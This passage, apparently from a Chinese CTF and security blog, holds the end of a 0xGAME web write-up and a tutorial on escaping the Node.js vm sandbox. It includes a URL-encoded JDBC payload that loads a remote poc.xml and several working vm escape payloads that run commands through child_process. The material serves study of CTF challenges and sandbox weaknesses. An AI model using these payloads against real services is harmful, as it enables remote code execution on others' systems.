class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%35</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%46</span><span class="hljs-variable">%61</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%79</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%66</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%2</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%70</span><span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%50</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%58</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%41</span><span class="hljs-variable">%70</span><span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%26</span><span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%46</span><span class="hljs-variable">%61</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%79</span><span class="hljs-variable">%41</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%74</span><span class="hljs-variable">%70</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%38</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%78</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span>&amp;username<span class="hljs-operator">=</span><span class="hljs-number">123</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-number">123</span></code></pre></div><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231123000646246.png" alt="image-20231123000646246"></p><h3 id="总结一下这两个方法"><a href="#总结一下这两个方法" class="headerlink" title="总结一下这两个方法"></a>总结一下这两个方法</h3><p>使用mysql的话注意 username 要单独传payload,</p><p>两个方法都要注意的是，<code>url</code>的参数要全部进行<code>url</code>编码（注意是全部，每个字符都要）， 防止服务器错把 <code>autoDeserialize</code>, <code>queryInterceptors</code> 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数</p><p>三篇参考文章还是非常推荐的，只不过我就大概看下结果吧，过程有点看不下去了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第二周开始就考的是对应知识点中较难的考点了，以前都没机会遇到</p><p>第三周对于我来说已经接近小型比赛的题目难度了（其实就是很模糊，有点感觉但做不出来）</p><p>第四周的java题没有考gadget，就是考各个的一些特性，然后后面两题就是考了依赖的漏洞，难度肯定是比考gadget要简单的，但确实不会，不一定搜的出来，难说啊，get不到考点</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/">https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>vm沙箱逃逸初识</title>
    <link href="/2023/11/20/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/"/>
    <url>/2023/11/20/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="沙箱逃逸初识"><a href="#沙箱逃逸初识" class="headerlink" title="沙箱逃逸初识"></a>沙箱逃逸初识</h1><p><a href="https://xz.aliyun.com/t/11859#toc-0">https://xz.aliyun.com/t/11859#toc-0</a></p><p>几乎是复现这篇文章，写文章是为了督促自己学习，顺便保存到本地</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>nodejs是javascript的运行环境，简单来说写在后端的javascript叫做nodejs</p><p>沙箱在我看来就是开创一个独立空间来运行有害的代码，从而避免影响到主机的功能</p><p>nodejs通过vm模块来创建一个沙箱</p><h2 id="node将字符串执行为代码"><a href="#node将字符串执行为代码" class="headerlink" title="node将字符串执行为代码"></a>node将字符串执行为代码</h2><p>age.txt</p><div class="code-wrapper"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span></code></pre></div><p>1.js</p><div class="code-wrapper"><pre><code class="hljs autoit"><span class="hljs-keyword">const</span> fs = require(<span class="hljs-string">&quot;fs&quot;</span>)<span class="hljs-comment">;</span>let y1 = fs.readFileSync(<span class="hljs-string">&#x27;age.txt&#x27;</span>,<span class="hljs-string">&#x27;utf-8&#x27;</span>)<span class="hljs-comment">;</span>console.<span class="hljs-built_in">log</span>(y1)<span class="hljs-comment">;</span><span class="hljs-built_in">eval</span>(y1)<span class="hljs-comment">;</span>console.<span class="hljs-built_in">log</span>(age)<span class="hljs-comment">;</span><span class="hljs-meta">##var age=18</span><span class="hljs-meta">##18</span></code></pre></div><p><code>fs.readFileSync</code>是用来读取文件，也就是<code>y1</code>其实是字符串，我们通过<code>eval</code>执行了一个字符串</p><p>但若当前作用域下已经有了同名的age变量就会报错</p><div class="code-wrapper"><pre><code class="hljs crmsh">const fs = require(<span class="hljs-string">&quot;fs&quot;</span>);let y1 = fs.readFileSync(&#x27;age.txt&#x27;,&#x27;utf-<span class="hljs-number">8</span>&#x27;);let age = <span class="hljs-number">20</span>;console.log(y1);eval(y1);console.log(age);SyntaxError: Identifier &#x27;age&#x27; has already been declared    at Object.<span class="hljs-tag">&lt;anonymous&gt;</span> (d:\ctf文件\nep\<span class="hljs-number">1</span>.js:<span class="hljs-number">7</span>:<span class="hljs-number">6</span>)    at Module._compile (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/cjs/loader:<span class="hljs-number">1256</span>:<span class="hljs-number">14</span>)    at Module._extensions..js (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/cjs/loader:<span class="hljs-number">1310</span>:<span class="hljs-number">10</span>)    at Module.load (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/cjs/loader:<span class="hljs-number">1119</span>:<span class="hljs-number">32</span>)    at Module._load (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/cjs/loader:<span class="hljs-number">960</span>:<span class="hljs-number">12</span>)    at Function.executeUserEntryPoint [as runMain] (<span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/modules/run_main:<span class="hljs-number">86</span>:<span class="hljs-number">12</span>)    at <span class="hljs-keyword">node</span><span class="hljs-title">:internal</span>/main/run_main_module:<span class="hljs-number">23</span>:<span class="hljs-number">47</span></code></pre></div><h3 id="方法二：new-function"><a href="#方法二：new-function" class="headerlink" title="方法二：new function"></a>方法二：new function</h3><p>上面使用eval会受到作用域的限制，我们可以使用<code>new Function</code>自己创建一个作用域</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> age = <span class="hljs-number">20</span>;<span class="hljs-keyword">const</span> y2 = <span class="hljs-keyword">new</span> Function(<span class="hljs-string">&#x27;age&#x27;</span>,<span class="hljs-string">&#x27;return age+1&#x27;</span>);   <span class="hljs-comment">//Function记得大写</span>console.log(y2(age));<span class="hljs-meta">## 21</span></code></pre></div><p><code>new Function</code>的第一个参数是形参名称，第二个参数是函数体</p><p>我们都知道函数内和函数外是两个作用域，不过当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就变的麻烦起来了。</p><p>从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个<strong>能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域</strong>，这也就是vm模块的作用</p><h2 id="nodejs作用域"><a href="#nodejs作用域" class="headerlink" title="nodejs作用域"></a>nodejs作用域</h2><p>Node项目时往往要在一个文件里<code>ruquire</code>其他的<code>js</code>文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的作用域（也叫上下文），包之间的作用域是互相隔离不互通的，也就是说就算我在y1.js中<code>require</code>了y2.js，那么我在y1.js中也无法直接调用y2.js中的变量和函数</p><div class="code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-comment">//age.js</span><span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs livecodeserver">//y2.jsconst <span class="hljs-keyword">a</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./age&#x27;</span>)console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">a</span>.age)<span class="hljs-comment">##undefined</span></code></pre></div><p>要想使用age，要用元素输出的接口<code>exports</code> ，把<code>age.js</code>修改成下面这样：</p><div class="code-wrapper"><pre><code class="hljs delphi"><span class="hljs-comment">//age.js</span><span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span><span class="hljs-keyword">exports</span>.age = age</code></pre></div><p>JavaScript中<code>window</code>是全局对象，浏览器其他所有的属性都挂载在<code>window</code>下，那么在服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。举个例子，<code>console</code>就是挂载在global下的一个全局变量，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）</p><p>这一部分学了javascript的人会很容易理解</p><p>所以我们可以手动生命全局变量，但全局变量在每个包中都是共享的，很容易被污染</p><div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">//y1.js</span><span class="hljs-string">global.age</span> <span class="hljs-string">=</span> <span class="hljs-number">20</span><span class="hljs-string">//y2.js</span><span class="hljs-string">const</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&quot;./y1&quot;)</span><span class="hljs-string">console.log(age)</span><span class="hljs-string">console.log(global)</span><span class="hljs-string">//global对象</span><span class="hljs-string">&lt;ref</span> <span class="hljs-string">*1&gt;</span> <span class="hljs-string">Object</span> [<span class="hljs-string">global</span>] &#123;  <span class="hljs-attr">global:</span> [<span class="hljs-string">Circular</span> <span class="hljs-string">*1</span>],  <span class="hljs-attr">queueMicrotask:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">queueMicrotask</span>],  <span class="hljs-attr">clearImmediate:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">clearImmediate</span>],  <span class="hljs-attr">setImmediate:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">setImmediate</span>] &#123;    [<span class="hljs-string">Symbol(nodejs.util.promisify.custom)</span>]<span class="hljs-string">:</span> [<span class="hljs-string">Getter</span>]  &#125;,  <span class="hljs-attr">structuredClone:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">structuredClone</span>],  <span class="hljs-attr">clearInterval:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">clearInterval</span>],  <span class="hljs-attr">clearTimeout:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">clearTimeout</span>],  <span class="hljs-attr">setInterval:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">setInterval</span>],  <span class="hljs-attr">setTimeout:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">setTimeout</span>] &#123;    [<span class="hljs-string">Symbol(nodejs.util.promisify.custom)</span>]<span class="hljs-string">:</span> [<span class="hljs-string">Getter</span>]  &#125;,  <span class="hljs-attr">atob:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">atob</span>],  <span class="hljs-attr">btoa:</span> [<span class="hljs-attr">Function:</span> <span class="hljs-string">btoa</span>],  <span class="hljs-attr">performance:</span> <span class="hljs-string">Performance</span> &#123;    <span class="hljs-attr">nodeTiming:</span> <span class="hljs-string">PerformanceNodeTiming</span> &#123;      <span class="hljs-attr">name:</span> <span class="hljs-string">&#x27;node&#x27;</span>,      <span class="hljs-attr">entryType:</span> <span class="hljs-string">&#x27;node&#x27;</span>,      <span class="hljs-attr">startTime:</span> <span class="hljs-number">0</span>,      <span class="hljs-attr">duration:</span> <span class="hljs-number">42.1528000831604</span>,      <span class="hljs-attr">nodeStart:</span> <span class="hljs-number">2.7959001064300537</span>,      <span class="hljs-attr">v8Start:</span> <span class="hljs-number">6.785400152206421</span>,      <span class="hljs-attr">bootstrapComplete:</span> <span class="hljs-number">29.24240016937256</span>,      <span class="hljs-attr">environment:</span> <span class="hljs-number">15.710000038146973</span>,      <span class="hljs-attr">loopStart:</span> <span class="hljs-number">-1</span>,      <span class="hljs-attr">loopExit:</span> <span class="hljs-number">-1</span>,      <span class="hljs-attr">idleTime:</span> <span class="hljs-number">0</span>    &#125;,    <span class="hljs-attr">timeOrigin:</span> <span class="hljs-number">1700487785879.164</span>  &#125;,  <span class="hljs-attr">fetch:</span> [<span class="hljs-attr">AsyncFunction:</span> <span class="hljs-string">fetch</span>],  <span class="hljs-attr">age:</span> <span class="hljs-number">20</span>&#125;</code></pre></div><h2 id="vm的一些函数（前置知识）"><a href="#vm的一些函数（前置知识）" class="headerlink" title="vm的一些函数（前置知识）"></a>vm的一些函数（前置知识）</h2><p><code>vm.runinThisContext(code)</code>：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性</p><p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231120214548117.png" alt="image-20231120214548117"></p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>)<span class="hljs-keyword">let</span> localvar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<span class="hljs-keyword">const</span> vmresult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localvar = &quot;123&quot;;&#x27;</span>);<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vmresult)<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(localvar)<span class="hljs-comment">//123</span><span class="hljs-comment">//initial value</span></code></pre></div><p>说明沙箱中的变量不会对当前作用域产生影响</p><p><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前<code>global</code>外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p><p>反正就是无法访问与沙箱同级的对象的属性</p><p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p><p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231120215301885.png" alt="image-20231120215301885"></p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;<span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> &#125;;vm.<span class="hljs-title function_">createContext</span>(sandbox);vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// &#123; globalVar: 2 &#125;</span><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span></code></pre></div><p>结果应证了上面的说法</p><ul><li><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</li><li><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</li><li><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。</li></ul><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-keyword">const</span> sandbox = &#123;    <span class="hljs-attr">animal</span>:<span class="hljs-string">&quot;cat&quot;</span>,    <span class="hljs-attr">count</span>:<span class="hljs-number">2</span>&#125;;<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;count +=1;name = &quot;kitty&quot;&#x27;</span>);<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);script.<span class="hljs-title function_">runInContext</span>(context);<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox));<span class="hljs-comment">//&#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span></code></pre></div><p>script对象可以通过runInXXXContext运行。</p><h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><p>进行rce，我们要获取process对象，然后<code>require(&#39;child_process&#39;)</code></p><p>但是我们上面说了在<code>creatContext</code>后是不能访问到<code>global</code>的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<span class="hljs-keyword">const</span> y1 = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>);<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y1);</code></pre></div><p><code>this</code>指向的是当前传递给<code>runInNewContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用<code>Function</code>的<code>constructor</code>生成的函数，最终返回了一个<code>process</code>对象</p><div class="code-wrapper"><pre><code class="hljs reasonml">const y1 = vm.run<span class="hljs-constructor">InNewContext(`<span class="hljs-params">this</span>.<span class="hljs-params">toString</span>.<span class="hljs-params">constructor</span>(&#x27;<span class="hljs-params">return</span> <span class="hljs-params">process</span>&#x27;)</span><span class="hljs-literal">()</span>`);</code></pre></div><p>这样子也可以返回process对象</p><p>然后我们就能</p><div class="code-wrapper"><pre><code class="hljs stylus">y1<span class="hljs-selector-class">.mainModule</span><span class="hljs-selector-class">.require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<span class="hljs-selector-class">.execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<span class="hljs-selector-class">.toString</span>()</code></pre></div><p>知识星球上</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-keyword">const</span> script = <span class="hljs-string">`m + n`</span>;<span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">m</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">n</span>: <span class="hljs-number">2</span> &#125;;<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)</code></pre></div><p>我们能不能把<code>this.toString.constructor(&#39;return process&#39;)()</code>中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。</p><p>如果我们将this换成m和n也是访问不到的，因为<strong>数字，字符串，布尔</strong>这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。</p><p>我们将mn改成其他类型就可以利用了：</p><div class="code-wrapper"><pre><code class="hljs zephir"><span class="hljs-keyword">const</span> inspect = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>).inspect<span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.Script(`(e =&gt; &#123;    <span class="hljs-keyword">const</span> y1 = x.toString.constructor(<span class="hljs-string">&#x27;return process&#x27;</span>)()  <span class="hljs-comment">//用m,n,x都行</span>    <span class="hljs-keyword">return</span> y1.mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>).toString()&#125;)()`)<span class="hljs-keyword">const</span> sandbox = &#123;m:[],n:&#123;&#125;,x: /regexp/&#125;;      <span class="hljs-comment">//只要m,n,x不为数字，字符串，布尔等都行</span><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.createContext(sandbox);<span class="hljs-keyword">const</span> res = script.runInContext(context);console.log(res);</code></pre></div><h3 id="this-获取不到对象时-arguments-callee-caller"><a href="#this-获取不到对象时-arguments-callee-caller" class="headerlink" title="this 获取不到对象时             arguments.callee.caller"></a>this 获取不到对象时             arguments.callee.caller</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>;<span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)</code></pre></div><p>我们现在的<code>this</code>为<code>null</code>，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p><p><strong>我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了</strong>。</p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><div class="code-wrapper"><pre><code class="hljs coffeescript">const vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);const script = `<span class="language-javascript">(<span class="hljs-function">() =&gt;</span> &#123;</span><span class="language-javascript">    <span class="hljs-keyword">const</span> a = &#123;&#125;</span><span class="language-javascript">    a.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">      <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;</span><span class="language-javascript">      <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))();</span><span class="language-javascript">      <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>()</span><span class="language-javascript">    &#125;</span><span class="language-javascript">    <span class="hljs-keyword">return</span> a</span><span class="language-javascript">  &#125;)()</span>`;const sandbox = <span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>);const context = <span class="hljs-keyword">new</span> vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)</code></pre></div><p>创建了一个对象，我们重写了该对象的<code>toString</code>方法，通过<code>arguments.callee.caller</code>获得到沙箱外的一个对象，沙箱外在console.log中字符串拼接触发<code>toString</code>方法，</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用<code>Proxy</code>来劫持属性</p><div class="code-wrapper"><pre><code class="hljs coffeescript">const vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);const script = `<span class="language-javascript"></span><span class="language-javascript">(<span class="hljs-function">() =&gt;</span>&#123;</span><span class="language-javascript">    <span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;</span><span class="language-javascript">        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;</span><span class="language-javascript">            <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))();</span><span class="language-javascript">            <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>();</span><span class="language-javascript">        